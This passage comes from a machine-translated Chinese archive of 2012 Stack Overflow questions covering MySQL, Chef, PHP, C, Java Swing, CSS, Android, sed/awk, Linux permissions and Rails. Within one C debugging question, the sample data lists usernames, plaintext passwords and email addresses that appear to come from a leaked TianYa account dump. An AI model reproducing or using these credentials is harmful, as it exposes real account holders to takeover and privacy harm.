| expo_id    | int(11) | YES  | MUL | NULL    |       |
| news_id    | int(11) | YES  | MUL | NULL    |       |
| press_id   | int(11) | YES  | MUL | NULL    |       |
| sort_order | int(11) | YES  |     | NULL    |       |
+------------+---------+------+-----+---------+-------+
7 rows in set (0,00 sec) 
```

由于我不是数据库设计专家，我想可能会有更好的设计来实现相同的目标。最好的设计是什么？

注1：请不要告诉我应该避免太多的关联：这是项目的一个特殊而精确的需求，我只需要找到最好的解决方案来使它成为可能。

注 2：顺便说一下，这是针对 Php/MySql Web 应用程序，我使用 Yii 作为框架。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T15:00:23.550

请不要按照你的建议去做。你是对的：如果你的实体之间有很多多对多的关系，你就会有很多连接表。但这比您提出的解决方案要好得多。严重地。

它将执行得更好，因为您的连接表中不会有任何空 id 值，这意味着您将获得索引的全部好处。

您的实体关系将更容易更新和排除故障。

在你转移到其他东西之后维护你的代码的人不会诅咒你的名字。换句话说，您将使用传统的 dbms 设计技术来解决传统问题，并且您的设计将是透明的。

有许多模式设计工具可以帮助您为所有这些连接表生成 DDL。提示：确保您的 id 列在整个过程中统一命名。即，在艺术家表、艺术家表和艺术家版表中将其称为艺术家id。如果您这样做，架构设计工具可以自动整理出您正在做的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-06T14:48:21.903

1.  如果在性能和维护方面正确完成（例如规范化），连接也不错。
2.  仅在实际出现需求时才去规范化。
3.  一开始就遵循最可能正确（并且有效！）的路径，不要担心性能或其他事情。
4.  过早的优化据说是万恶之母。
5.  将适当的索引添加到外键（MySQL 自动覆盖这一点）和用于`WHERE`,`ON`等的字段`ORDER BY`。

# chef-infra - 如何使用应用程序说明书定义 before_symlink 回调？

> ID：12760557
> 
> 赞同：5
> 
> 时间：2012-10-06T14:14:00.513
> 
> 标签：chef-infra

我正在开发一本食谱来部署一个简单的基于 jekyll 的博客。我使用“应用程序”食谱作为基础。除了厨师简单地忽略我定义的回调之外，一切都很顺利。

Chef 日志包含有关我的回调的条目，但我没有看到回调执行的错误或结果。

这是 recipes/default.rb 文件：

```
include_recipe "git"

application "example_com" do
  path "/var/www/example.com"
  repository "git@example.org:xxx/xxx.git"
  revision "master"

  deploy_key <<EOF
-----BEGIN RSA PRIVATE KEY-----
..skip...
-----END RSA PRIVATE KEY-----
EOF

  # before_symlink "script/bootstrap"

  before_deploy do
    # raise
    # Chef::Log.info("INSANE!")
    execute "bundle exec rake generate" do
      cwd release_path
    end
  end
end 
```

这是 chef-client 说它执行 before_deploy 回调的日志：

```
[2012-10-06T10:06:20-04:00] INFO: Processing ruby_block[example_com before_deploy] action create (/var/cache/chef/cookbooks/application/providers/default.rb line 107)
[2012-10-06T10:06:20-04:00] DEBUG: Got callback before_deploy: #<Proc:0x00007f0509788088@/var/cache/chef/cookbooks/example_com/recipes/default.rb:24>
[2012-10-06T10:06:20-04:00] INFO: application[example_com] running callback before_deploy
[2012-10-06T10:06:20-04:00] INFO: ruby_block[example_com before_deploy] called
[2012-10-06T10:06:20-04:00] INFO: Processing deploy_revision[example_com] action deploy (/var/cache/chef/cookbooks/application/providers/default.rb line 122) 
```

我也尝试使用字符串定义回调，但结果是一样的。当没有带有回调定义的文件时，Chef 会显示错误，如果文件在正确的位置，则简单地忽略该文件。

**更新 1**

在深入挖掘 Chef 资源后，我意识到回调是在单独的 chef runner 中执行的，这不会立即发生。当应用程序说明书中的代码调用 _recipe_eval_ 来评估回调主体时，Chef 创建单独的运行器并且代码不会执行，直到调用*收敛*方法。

所以，我稍微修改了应用程序说明书。我在 _recipe_eval_ 之后添加了调用*收敛，一切都开始工作了。*

我认为这是一个错误，我将在官方 Opscode 跟踪器中创建一个问题。但是，非常欢迎任何评论！

这是应用程序/库/default.rb 的修改版本：

```
class Chef
  class Provider
    module ApplicationBase

    # ...skip...

      def callback(what, callback_code=nil)
        Chef::Log.debug("Got callback #{what}: #{callback_code.inspect}")
        @collection = Chef::ResourceCollection.new
        case callback_code
        when Proc
          Chef::Log.info "#{@new_resource} running callback #{what}"
          # recipe_eval(&callback_code)
          recipe_eval(&callback_code)
          converge # <--- Remove this line and no callbacks will work.
        when String
          callback_file = "#{release_path}/#{callback_code}"
          unless ::File.exist?(callback_file)
            raise RuntimeError, "Can't find your callback file #{callback_file}"
          end
          run_callback_from_file(callback_file)
        when nil
          nil
        else
          raise RuntimeError, "You gave me a callback I don't know what to do with: #{callback_code.inspect}"
        end
      end
    end
  end
end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-01T06:29:43.133

Opscode 刚刚确认这是 Chef 中的错误。如果有人需要更多详细信息和修复状态，请使用以下链接：

*   [http://tickets.opscode.com/browse/COOK-1747](http://tickets.opscode.com/browse/COOK-1747)
*   [http://tickets.opscode.com/browse/CHEF-3493](http://tickets.opscode.com/browse/CHEF-3493)

# arrays - 数组中的 stsClass 对象

> ID：12760560
> 
> 赞同：0
> 
> 时间：2012-10-06T14:14:19.807
> 
> 标签：arrays, stdclass, control-structure

我`var_dumped`是一个变量并得到了这个，我怎样才能正确显示它？

像，
`<p> Name: <?php echo $Firstname.' '.$Lastname; ?>
Country: <?php echo $country; ?></p>`

```
 <?php
 array(3) { 
        [0]=> object(stdClass)#19 (3) { 
                                    ["Firstname"]=> string(4) "John"
                                    ["Lastname"]=> string(4) "Lest"
                                    ["Country"]=> string(3) "USA" 
                                    }
        [1]=> object(stdClass)#20 (3) {
                                    ["Firstname"]=> string(5) "Larry" 
                                    ["Lastname"]=> string(4) "Jems" 
                                    ["Country"]=> string(6) "Canada" 
                                    } 
        [2]=> object(stdClass)#21 (3) { 
                                    ["Firstname"]=> string(3) "Jim"
                                    ["Lastname"]=> string(5) "Ricks" 
                                    ["Country"]=> string(7) "England" 
                                    }
    }
 ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-06T14:22:32.620

`stdClass`是（某种）匿名对象。Firstname、Lastname 和 Country 是属性。要访问它们：

```
echo $obj->Firstname 
```

# windows - WinXp下如何通过地址定位指令？

> ID：12760567
> 
> 赞同：1
> 
> 时间：2012-10-06T14:15:54.507
> 
> 标签：windows, gcc, gdb, malloc, mingw32

我的程序在 WinXp 的 MINGW32 上运行。该程序由gcc编译并使用gdb调试工具得到预期的结果。但是在MINGW32下直接运行时，WinXp会报错：

“0x7c956a6e”指令引用了“0x00000000”的内存。该内存无法“读取”。

那么如何定位这条指令呢？我已经检查过了，它似乎是由 malloc 函数引起的。源码如下：</p>

```
int find(FILE *fp, char **head) {
    char str[100];
    char *p, c;
    int i = 0, j = 0;

    do {
        c = fgetc(fp);
        if(c == EOF)
            return 0;
    } while(c == ' ' || c == '\n');

    while(c != ' ' && c != '\n') {
        str[i++] = c;
        c = fgetc(fp);
    } 

    *head = (char *)malloc(sizeof(char) * i);
    if(*head == NULL)
        printf("\nCannot get memory (find)");
    else {
        p = *head;
        for(j = 0; j < i; j++) {
            *(p++) = str[j];
        }
        *p = '\0';
        return 1;
    }
    return 0;
} 
```

如果有人可以提供帮助，我们将不胜感激！

10/7 感谢您的评论。这是其余的代码和数据模式：

```
int main() 
{
    FILE *fp;
    int lines = 0,  i = 0;
    TianYa *yp, *linep;
    char *head = NULL;

    fp = fopen("tysample.txt", "r");

    if(fp == NULL)
        printf("\nCannot open file");
    else {
        yp = (TianYa *)malloc(TIAN_YA_LINES * sizeof(TianYa));
        if(yp == NULL)
            printf("\nCannot get memory (main)");
        else {
            linep = yp;
            i = 0;
            while(find(fp, &head) != 0) {
                switch(i++) {
                    case 0:
                        linep->name = head;
                        break;
                    case 1:
                        linep->passwd = head;
                        break;
                    case 2:
                        linep->email = head;
                        i = 0;
                        linep++;
                        lines++;
                        break;
                }
            }
        }
    }
    linep = yp;
    for(i = 0; i < lines; i++) {
        printf("\nName:%s, Passwd:%s, Email:%s", linep->name, linep->passwd, linep->email);
/*      free(linep->name);
        free(linep->passwd);
        free(linep->email);
*/      linep++;
    }

    free(yp);
    yp = NULL;
    linep = NULL;

    if(fclose(fp))
        printf("\nFailed to close file");

    return 0;
}

momre           123456           baitianyang@live.cn
白天也懂           123456           baitianyedong@tianya.cn
baitiansosuo           weirenminfuwu           baitianyouxiang@sohu.com
heng__chang           87732351           baitianyu.06@163.com
风正                           5581100           baitianyu@126.com
sparkbai           20001228           baitianyu@tianya.cn
背粪篓进银行           19851019           baitianyu123@163.com
白天月           11200929           baitianyue@126.com 
```

# java - 将 JFrame 添加到 JFrame，强制关闭新的 JFrame，然后才能再次使用第一个 JFrame

> ID：12760568
> 
> 赞同：0
> 
> 时间：2012-10-06T14:15:58.180
> 
> 标签：java, swing, user-interface, jframe, jdialog

我正在尝试将`JFrame`（bar）添加到`JFrame`（foo），这将强制`bar`关闭，然后`foo`才能再次集成。

例如，在我可以再次编写代码之前，必须关闭“About Eclipse”框架：

![例子](../Images/bf2a31bbdd29f0055ec179534328f703.png)

像这样的东西不会起作用（简化）：

```
JFrame foo = new JFrame("Base");
JFrame bar = new JFrame("About");
foo.add(bar); // IllegalArgumentException: adding a window to a container 
```

如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:20:57.597

您可以使用这样的 JDialog

```
JFrame foo = new JFrame("Base");
JDialog bar = new JDialog(foo, "About", true); 
```

# sitecore - 在 Sitecore 中保存时获取 Google 地图坐标？

> ID：12760569
> 
> 赞同：3
> 
> 时间：2012-10-06T14:16:02.380
> 
> 标签：sitecore

我有一个 Sitecore 6 解决方案，编辑可以在其中创建项目并在字段中输入地址。然后使用该地址在前端在 Google 地图上进行查找。

但是每次在前端加载页面时都不必在 GMap 中进行查找，我想在编辑器保存项目后获取输入地址的坐标，然后将这些坐标保存到相同的另一个字段物品。

我怎么能这样做？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-06T15:26:25.440

您需要创建一个订阅 item:saved 事件的事件处理程序。[http://sdn.sitecore.net/Articles/API/Using%20Events.aspx](http://sdn.sitecore.net/Articles/API/Using%20Events.aspx)

要从地址中检索 lat/lng，您可以使用 Google 地理编码网络服务[Google Maps API - 获取地址坐标](https://stackoverflow.com/questions/3652951/google-maps-api-get-coordinates-of-address)

# javascript - 单页网站锚名称链接到页面顶部没有转到页面顶部

> ID：12760571
> 
> 赞同：1
> 
> 时间：2012-10-06T14:16:17.847
> 
> 标签：javascript, html, css

我有一个简单的单页网站，其中包含一些带有命名链接的导航。其中一个链接指向一个 id 为“home”的 div，它位于 body 标签的正下方。此链接的目标是返回到页面顶部，然而，当被选中时，页面将返回到页面顶部的下方（例如，需要您稍微向上滚动）。

在 Chrome、Firefox 和 Safari 上确认。没有javascript就不可能吗？仅供参考：我尝试使用 jsfiddle 并没有问题。

这是html：

```
<html>
  <head>
    <link rel="stylesheet" type="text/css" href="main.css">
      <link href='http://fonts.googleapis.com/css?family=Cantata+One' rel='stylesheet' type='text/css'>
    </head>

<body>
    <div id="home">
        <div id="nav">
     <ul>
         <li><a href="#home">Home</a></li>
         <li><a href="#experiments">Experiments</a></li>
         <li><a href="#contact">Contact</a></li>
     </ul>
    </div>
        <h1>
          <span id="i">i</span> 
          <span id="n">n</span>
          <span id="c">c</span>
        </h1>
      <h2>
          <span id="tagline">"angel investor, coder want-to-be, nikola tesla groupie."</span>
    </h2>
</div>

<div id="experiments">
      <span id="ex">ex</span>   
          <span id="amples">amples</span>
    </div>
</body> 
```

这是CSS：

```
/**
 * Eric Meyer's Reset CSS v2.0 (http://meyerweb.com/eric/tools/css/reset/)
 * http://cssreset.com
 */
REMOVED THIS PART OF THE CSS FOR BREVITY

/* Beginning of Custom CSS */

body {
background-image: url("straws.png");
 }

@Font-face {
font-family: 'curly';
src: url('fonts/HoneyScript-Light.ttf') format('truetype');
}

/* Main Title & Tag Line */
#home{
height: 1000px;
}
h1 {
    z-index: -100;
  text-align: center;
  margin-top: 10px;
  text-align: center;
}
#i {
    font-family: 'curly', serif;
    color: orange;
    font-size: 20em;
    text-shadow: 3px 3px 7px #999;
  }
 #n {
font-family: courier;
    color: black;
    font-size: 10em;
    text-shadow: 3px 3px 7px #999, -1px -1px -1px white, 1px 1px 0 #BBB;
}
#c {
        font-family: 'curly', serif;
    color: gray;
    font-size: 5em;
    text-shadow: 2px 2px 7px #999, -1px -1px -1px white, 1px 1px 0 #BBB;
}   
h2 {
  position: relative;
  top: -50px;
  text-align: center;
}  
 #tagline {
font-family: 'Cantata One' serif;
color: #666;
font-size: 2em;
}

/* Navigation */
#nav {
position: fixed;
margin-left: 45%;
font-family: 'arial';
font-size: 2em;
  margin-top: 40px;
}
#nav li {
display: inline;
margin-right: 10px;
 }
#nav li a {
color: grey;
text-decoration: none;
border: 2px solid black;
.webkit-box-shadow: 5px 5px 5px #777777;
box-shadow: 5px 5px 5px #777777;
padding: 5px;
} 
#nav li a:hover {
color: black;
}

#experiments{
height: 1000px;
 }
 #ex {
    font-family: 'curly', serif;
    color: orange;
    font-size: 20em;
    text-shadow: 3px 3px 7px #999;
  }
#amples {
font-family: courier;
    color: black;
    font-size: 10em;
    text-shadow: 3px 3px 7px #999, -1px -1px -1px white, 1px 1px 0 #BBB;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:28:08.100

不要显式设置#home 的高度，而是尝试使用溢出：自动

```
#home{
    overflow: auto;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:18:19.463

在开始的正文标记之后使用命名锚

```
<body> <a name="top"></a> 
```

然后重定向到#top，它会弹出。否则你必须使用js。

# android - 如何打开屏幕？

> ID：12760573
> 
> 赞同：6
> 
> 时间：2012-10-06T14:16:23.743
> 
> 标签：android, screen

*重复警告：此问题适用于服务和前端，有一些类似的线程，但专注于 GUI 方法。*

## 问题

从任何状态开始（音乐在后台播放、屏幕打开（原文如此！）、屏幕关闭、手机锁定、手机解锁等）我只想更改状态中的一件事——打开屏幕. 没有其他东西应该改变。

## 尝试

要从某个已知状态开始，我锁定手机并关闭屏幕：

```
DevicePolicyManager dpm = (DevicePolicyManager)context
                .getSystemService(Context.DEVICE_POLICY_SERVICE);
dpm.lockNow(); 
```

所以从现在开始，打开屏幕将意味着实际显示键盘保护。我尝试这样做：

*   强迫`userActivity`——什么都没有发生
*   唤醒锁的各种组合 - 唤醒太弱（就像`PARTIAL_WAKE_LOCK`- 什么都没有发生）或者它触发屏幕，但只要我保持锁定。一旦我释放它，屏幕就会回到关闭状态（尽管我已经`ON_AFTER_RELEASE`设置）；小问题是我必须在一段时间后获得唤醒锁，`lockNow`否则`lockNow`会被简单地取消

## 解决方法

这几乎是 [Anton Cherkashyn](https://stackoverflow.com/users/1204377/anton-cherkashyn "Anton Cherkashyn")[更改屏幕亮度系统设置 Android](https://stackoverflow.com/questions/6708692/changing-the-screen-brightness-system-setting-android/9848456#9848456)的复制和粘贴

您需要添加触发屏幕的虚假活动：

```
public class DummyBrightnessActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);            
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);

        //this next line is very important, you need to finish your activity with slight delay
        new Handler().postDelayed(new Runnable() { 
             public void run() { 
                 DummyBrightnessActivity.this.finish();
                 } },0);
    }

} 
```

接下来，您必须启动此活动（在我的情况下，它通常是非活动的，因此是背景选项）：

```
new Handler().postDelayed(new Runnable() { 
    public void run() { 
        Intent intent = new Intent(context, DummyBrightnessActivity.class);
        intent.addFlags(Intent.FLAG_FROM_BACKGROUND | Intent.FLAG_ACTIVITY_NEW_TASK); 
        context.startActivity(intent);
        } },500); 
```

而且您必须在清单中通知您的应用有关此虚假活动的信息：

```
<activity android:name=".DummyBrightnessActivity"
          android:excludeFromRecents="true"
          android:theme="@android:style/Theme.Translucent.NoTitleBar"
          android:taskAffinity="com.antonc.phone_schedule.Dummy">
</activity> 
```

（上面——它被放置在我的应用程序的主命名空间中）。

问题是它很长而且不可靠——第一个延迟（在活动中）工作为 0 很好，但第二个......不同的故事，当我做一些日志记录时，“350”就足够了，但是一旦我放弃了日志记录（因此执行速度更快）我不得不增加价值。

所以现在面对你有“screenOn”功能的事实，但它不起作用，因为有些用户会购买更快的手机;-)

不管怎样，还是在寻找更好的东西……

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-04-01T16:15:34.313

希望下面的示例对您有所帮助，不要忘记释放您的唤醒锁！

```
PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
WakeLock wl = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK, "wakelock_event_name");

wl.acquire();
 // Your Code
wl.release() 
```

你也可以使用 // when - 发生这种情况的时间**SystemClock.uptimeMillis** (); pm.userActivity（**当**，真/假）

# c++ - Windows 上的字符串大小与 Linux 上的不同

> ID：12760574
> 
> 赞同：4
> 
> 时间：2012-10-06T14:16:24.427
> 
> 标签：c++, windows, linux, string, size

我偶然发现了**string::substr**的奇怪行为。通常我在 Eclipse+MinGW 中的**Windows 7**上进行编码，但是当我在笔记本电脑上工作时，在**Linux**（Ubuntu 12.04）中使用 Eclipse 时，我注意到结果有所不同。

我正在使用填充了文本行的**向量<字符串> 。**其中一个步骤是从行中删除最后一个字符。

在win7 Eclipse中我做了：

```
for( int i = 0; i < (int)vectorOfLines.size(); i++ )
{
    vectorOfTrimmedLines.push_back( ((string)vectorOfLines.at(i)).substr(0, ((string)vectorOfLines.at(i)).size()-1) );
} 
```

它按预期工作（从每一行中删除最后一个字符）

但在 Linux 中，此代码不会修剪。相反，我需要这样做：

```
//  -2 instead -1 character
vectorOfTrimmedLines.push_back( ((string)vectorOfLines.at(i)).substr(0, ((string)vectorOfLines.at(i)).size()-2) ); 
```

或使用另一种方法：

```
vectorOfTrimmedLines.push_back( ((string)vectorOfLines.at(i)).replace( (((string)vectorOfLines.at(i)).size()-2),1,"",0 )); 
```

当然，Linux 方法在 Windows 上的工作方式是错误的（修剪 2 个最后一个字符，或在最后一个之前替换一个）。

问题似乎是 myString.size() 在 Windows 中返回字符数，但在 Linux 中它返回字符数 + 1。难道是换行符在 Linux 上被计算？

作为 C++ 和一般编程的新手，我想知道为什么会这样，以及如何做到独立于平台。

我想知道的另一件事是：哪种方法更可取（更快）**substr**或**replace**？

编辑：用于填充字符串的方法我写了这个函数：

```
vector< string > ReadFile( string pathToFile )
{
    //  opening file
    ifstream myFile;
    myFile.open( pathToFile.c_str() );

    //  vector of strings that is returned by this function, contains file line by line
    vector< string > vectorOfLines;

    //  check if the file is open and then read file line by line to string element of vector
    if( myFile.is_open() )
    {
        string line;    //  this will contain the data read from current the file

        while( getline( myFile, line ) )    //  until last line in file
        {
            vectorOfLines.push_back( line );    //  add current line to new string element in vector
        }

        myFile.close(); //  close the file
    }

    //  if file does not exist
    else
    {
        cerr << "Unable to open file." << endl; //  if the file is not open output
        //throw;
    }

    return vectorOfLines;   //  return vector of lines from file
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-06T14:37:26.413

不同操作系统上的文本文件并不相同。Windows 使用两个字节的代码来标记一行的结束：0x0D、0x0A。Linux 使用一个字节 0x0A。`getline`（以及大多数其他输入函数）知道为其编译的操作系统的约定；当它读取操作系统用来表示行尾的字符时，它会将字符替换为“\n”。所以如果你在Windows下写一个文本文件，行以0x0D、0x0A结尾；如果您在 Linux 下阅读该文本文件，`getline`看到 0x0D 并将其视为普通字符，那么它会看到 0x0A 并将其视为行尾。

因此，道德是当您将文本文件从一个系统移动到另一个系统时，您**必须将它们转换为本地表示。**`ftp`知道如何做到这一点。如果您在虚拟机中运行，则必须在切换系统时手动进行转换。使用 Unix 命令行很简单`tr`。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-10-06T14:37:47.440

这是因为在 Windows 中，换行符由两个字符 CR+LF 表示，而在 Linux 上它只有 LF，而在 Mac（OSX 之前）上它只有 CR。

只要你只在 Linux 系统上使用 Linux 上生成的文件，或者在 Windows 系统上使用 Windows 上生成的文件，你就不用担心了。但是，一旦您需要在 Windows 上使用在 Linux 上生成的文件，反之亦然，您需要正确处理换行符。

第一步，您需要以二进制模式打开文件`std::ofstream infile( "filename", std::ios_base::binary);`，然后您有三个选项：

1.  您需要为所有平台确定一个换行符约定并一致地使用它，
2.  您需要能够检测当前文件中使用的换行约定（通常通过检查第一行使用的换行来实现），将其保存在变量中，并将其传递给需要处理换行的字符串函数，
3.  告诉用户将文件转换为正确的换行符，例如使用 dos2unix 和 unix2dos，或者如果文件传输涉及 FTP，则使用 ASCII 模式

或者，如前所述，使用 Boost。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-06T21:50:38.663

Windows 和 Linux/Unix 中的行尾不同——Windows 使用两个字节，Linux 使用一个。谷歌如何在 .nix 命令行上使用 tr，你会看到如何转换它们。

祝你好运！

# php - php数组随机

> ID：12760580
> 
> 赞同：-3
> 
> 时间：2012-10-06T14:17:09.977
> 
> 标签：php, arrays

我有php数组

```
Array(
[0] => Array
    (
        [boxId] => 917
        [contentId] => 72
        [sectionType] => hp_spl_contestants
        [contentTypeId] => 83
        [categoryId] => 0
        [countryId] => 5
        [data] => {"title":"Contestant No.1","button_txt":"Latest From","image":"2d4f8f52d49d1ab9930bc40157013a31.jpg","author":"Meenakshi Negi","url":"","date":"2012-10-04 18:16:30","badget":0,"badget_date":""}
        [insertDate] => 2012-10-05 21:05:57
        [sortorder] => 1
        [sitename] => bb6
    )

[1] => Array
    (
        [boxId] => 918
        [contentId] => 63
        [sectionType] => hp_spl_contestants
        [contentTypeId] => 83
        [categoryId] => 0
        [countryId] => 5
        [data] => {"title":"Contestant No.2","button_txt":"Latest From","image":"37154a5322838f61fb60cc24c8b5fe04.jpg","author":"Meenakshi Negi","url":"","date":"2012-10-04 18:09:06","badget":0,"badget_date":""}
        [insertDate] => 2012-10-05 21:06:16
        [sortorder] => 2
        [sitename] => bb6
    )

[2] => Array
    (
        [boxId] => 919
        [contentId] => 64
        [sectionType] => hp_spl_contestants
        [contentTypeId] => 83
        [categoryId] => 0
        [countryId] => 5
        [data] => {"title":"Contestant No.3","button_txt":"Latest From","image":"f90ba1195b1dd5a57308b46e1b248d49.jpg","author":"Meenakshi Negi","url":"","date":"2012-10-04 18:09:06","badget":0,"badget_date":""}
        [insertDate] => 2012-10-05 21:06:36
        [sortorder] => 3
        [sitename] => bb6
    )

[3] => Array
    (
        [boxId] => 920
        [contentId] => 65
        [sectionType] => hp_spl_contestants
        [contentTypeId] => 83
        [categoryId] => 0
        [countryId] => 5
        [data] => {"title":"Contestant No.4","button_txt":"Latest From","image":"d439ab109de8202914ea7439c1f7650b.jpg","author":"Meenakshi Negi","url":"","date":"2012-10-04 18:09:06","badget":0,"badget_date":""}
        [insertDate] => 2012-10-05 21:06:55
        [sortorder] => 4
        [sitename] => bb6
    ) 
```

我们可以随机化这个数组的值吗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-06T14:18:19.647

您可以使用[随机播放](http://php.net/manual/en/function.shuffle.php)功能。

```
shuffle($cdata); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-06T14:27:24.167

shuffle() 和 array_rand() 会有所帮助

[http://php.net/manual/en/function.array-rand.php](http://php.net/manual/en/function.array-rand.php)

[http://php.net/manual/en/function.shuffle.php](http://php.net/manual/en/function.shuffle.php)

# shell - 在文件中搜索多个模式并在模式匹配时删除行

> ID：12760587
> 
> 赞同：6
> 
> 时间：2012-10-06T14:17:48.247
> 
> 标签：shell, unix, scripting, sed, awk

例如，一个文件包含以下内容：

```
10.45.56.84 raj
10.49.31.81 mum
10.49.31.86 mum
10.81.51.92 guj
10.45.56.116 raj
10.45.56.84 raj 
```

如果模式匹配，我想在上面的文件中搜索`10.45.56.84`并`10.81.51.92`删除行。

我也想在单个命令中执行此操作。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-06T14:46:15.793

另一种解决方案：

```
 awk '!/10.45.56.84|10.81.51.92/' file 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-10-06T14:31:21.897

你可以这样做：

```
sed -e '/10[.]45[.]56[.]84/d;/10[.]81[.]51[.]92/d' file 
```

这有两个用分号分隔的 sed "d" 删除命令。但是，只有当它们与每个命令之前的斜线之间包含的相应模式匹配时，它们才会被执行。

您还可以使用 grep：

```
grep -Ev '10[.]45[.]56[.]84|10[.]81[.]51[.]92' file 
```

“-v”标志告诉 grep 只打印与模式不匹配的行，我们使用 OR 运算符“|” 匹配任一模式。使用了“-E”标志，因此我们不必使用反斜杠转义 OR 运算符。

在这两种情况下，我们都将句点放在括号之间，否则句点将用作匹配任何字符的运算符。您可以在一对括号内放置更多字符，它们将被解释为匹配指定的字符之一。

希望这会有所帮助=)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-10-06T17:10:12.867

这可能对您有用（GNU sed）：

```
sed -r '/10\.(45\.56\.84|81\.51\.92)/d' file 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2012-10-06T18:54:10.017

```
grep -Fv -f <(echo $'10.45.56.84\n10.81.51.92') filename 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-02-01T13:39:14.020

awk -F " " '{if($1 != "10.45.56.84") if($1 != "10.81.51.92" ) { print $0;}}' inputFile > OutputFile

**解释**: awk : awk 是一种用于操作数据和生成报告的脚本语言。

" " : 用于分隔符。如果数据由 | 分隔 然后需要提到像“|”

{if($1 != "10.45.56.84") if($1 != "10.81.51.92" ) { print $0;}}' : 模式（条件）并在 outputFile 中打印

# linux - Linux中的通用文件夹

> ID：12760605
> 
> 赞同：0
> 
> 时间：2012-10-06T14:20:08.533
> 
> 标签：linux, permissions, shared

我的 Ubuntu 机器上有两个用户。我想在这些用户之间共享一些媒体文件，所以我在 /home/ 中创建了一个名为“media”的目录。我创建了“媒体”组，并将用户“rks171”添加到“媒体”组。所以：

```
sudo groupadd media
sudo mkdir -p /home/media
sudo chown -R root.media /home/media 
sudo chmod g+s /home/media 
```

如[本文所述。](https://superuser.com/questions/88874/where-on-a-linux-file-system-should-someone-put-media-intended-to-be-accessible "这个帖子")

然后，我将我的用户添加到组中：

```
sudo usermod -a -G media rks171 
```

然后我还为我的组添加了对该文件夹的写入权限：

```
sudo chmod -R g+w media 
```

所以现在，做 'ls -lh' 给出：

```
drwxrwsr-x  2 root   media  4.0K Oct  6 09:46 media 
```

我试图将图片从我的用户目录复制到这个新目录：

```
mv /home/rks171/Pictures/* /home/media/ 
```

我得到“许可被拒绝”。我不明白出了什么问题。

如果我只是输入“id”，它不会显示我的用户 rks171 是“媒体”组的一部分。但是，如果我键入“i​​d rks171”，那么它确实表明我的用户 rks171 是“媒体”组的一部分。有人知道为什么我不能将文件放入这个公用文件夹吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T15:12:48.590

为了完整起见，我在这里重新发布这个问题的答案。只需注销并重新登录以创建新会话即可。这使我添加到组中生效。

# java - Java 日志记录 - 将字符串附加到先前的日志消息

> ID：12760606
> 
> 赞同：0
> 
> 时间：2012-10-06T14:20:09.113
> 
> 标签：java, logging, append, line

我`java.util.logging`用于记录许多文件操作（如复制、删除、移动、mkdir）。下面是一个示例复制作业：

```
try {
    LOGGER.log(Level.FINE, "Copying Binary [ {0} ] to SDCard folder [ {1} ]", new Object[]{src, dst});
    org.apache.commons.io.FileUtils.copyFileToDirectory(src, dst);
    // append "..Ok" to previous log message
} 
catch ( FileNotFoundException e ) {
    LOGGER.log(Level.WARNING, "FileNotFoundException: Binary ["+ src.getAbsolutePath() + "] is missing");
}
catch (IOException e) {
    LOGGER.log(Level.WARNING, "IOException: Binary [" + src.getAbsolutePath() + "] is unaccessible");
} 
```

是否可以将文本附加`..Ok`到以前的日志消息中？所以输出会说：

```
FINE: Copying Binary [ C:\dir\sub\a.bin ] to SDCard [   Y:\SDCard ]  ..OK 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-06T14:26:45.647

不，您不能装饰日志记录。但是，您可以构建一个字符串并仅在完成后记录它。

# ruby-on-rails - 如何确保在 rails 单元测试中正确更新 counter_cache？

> ID：12760609
> 
> 赞同：1
> 
> 时间：2012-10-06T14:20:41.877
> 
> 标签：ruby-on-rails, unit-testing, ruby-on-rails-3.2, minitest, counter-cache

我已经`counter_cache`为我的 Rails 3.2.6 模型进行了正常设置。它在 webapp 中完美运行，但在单元测试中失败。

以下片段说明了手头的问题：

```
test "counter_cache ..." do
    u = FactoryGirl.create(:customer)
    FactoryGirl.create(:order, :customer => u)

    # u.orders.count == 1; rest is always 0
    assert_equal u.orders.count, u.orders_count  # FAILS!
    assert_equal u.orders.count, u.orders.size   # FAILS!
    assert_equal u.orders.count, u.orders.length # FAILS!
end 
```

*请注意，我在不使用 FactoryGirl 的情况下尝试了相同的操作，但仍然失败。*

**如何确保在单元测试中正确更新 counter_cache？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-06T14:31:46.583

问题是它`u`不知道创建了属于它的订单，因此它没有更新其状态以反映这一点。你至少有两个选择：

*   `reload`创建订单后的用户实例 ( `u`)，因为它不知道添加了订单：

    ```
    u.reload 
    ```

*   通过用户创建订单：

    ```
    u.orders << FactoryGirl.build(:order) 
    ```

    （如果你有 ，这个可能有点挑剔`after_create`，或者即使你没有——FactoryGirl 可能做的太多，有时会把事情搞砸）。

# javascript - 我可以用原型函数简化它吗？

> ID：12760615
> 
> 赞同：1
> 
> 时间：2012-10-06T14:21:07.137
> 
> 标签：javascript, jquery

我是 jQuery 原型的新手。我多次执行相同的代码：

```
 $message
        .removeClass()
        .addClass("message error")
        .show()
        .html('<li>' + json.Errors.join('</li><li>') + '</li>'); 
```

